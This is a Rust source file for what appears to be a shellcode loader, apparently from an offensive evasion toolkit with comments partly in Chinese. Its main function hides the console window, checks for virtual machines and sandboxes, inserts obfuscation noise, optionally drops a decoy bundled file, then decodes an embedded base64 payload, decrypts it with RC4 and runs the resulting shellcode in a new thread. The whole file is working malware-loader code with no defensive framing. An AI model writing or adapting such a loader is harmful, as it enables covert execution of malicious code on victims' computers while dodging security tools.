#![windows_subsystem = "windows"]
mod forgery;
mod guard;
mod utils;
use utils::obfuscation_noise;
mod exec;
mod decrypt;

#[cfg(feature = "base64_decode")]
use std::process;
#[cfg(feature = "base64_decode")]
use base64::engine::general_purpose::STANDARD;
#[cfg(feature = "base64_decode")]
use base64::Engine;
#[cfg(feature = "base64_decode")]
const ENCRYPT_B64: &'static [u8] = include_bytes!("encrypt.bin");

// Decode embedded base64 payload
#[cfg(feature = "base64_decode")]
fn base64_decode_payload() -> Option<Vec<u8>> {
    // Decode base64 from the embedded constant
    let raw = std::str::from_utf8(ENCRYPT_B64).ok()?;
    let decoded = STANDARD.decode(raw.trim()).ok()?;
    // New format: return decoded bytes (x||c2||hash1||c1) - detailed validation is performed by the executor
    Some(decoded)
}

fn main() {
    
    #[cfg(feature = "sandbox")]
    guard::guard_vm();

    obfuscation_noise();
    
    #[cfg(feature = "with_forgery")]
    forgery::bundle::bundlefile();

    // Base64解码载荷
    #[cfg(feature = "base64_decode")]
    let decrypted_data = match base64_decode_payload() {
            Some(d) => d,
            None => process::exit(0),
    };

    obfuscation_noise();
    
    // 选择解密方式
    #[cfg(feature = "decrypt_rc4")]
    let shellcode_ptr: usize = unsafe { decrypt::decrypt_by_rc4(&decrypted_data).expect("解密失败") };

    obfuscation_noise();

    // 运行方式分支
    #[cfg(feature = "run_create_thread")]
    unsafe { exec::run_create_thread(shellcode_ptr as *mut std::ffi::c_void).expect("CreateThread 失败"); }
}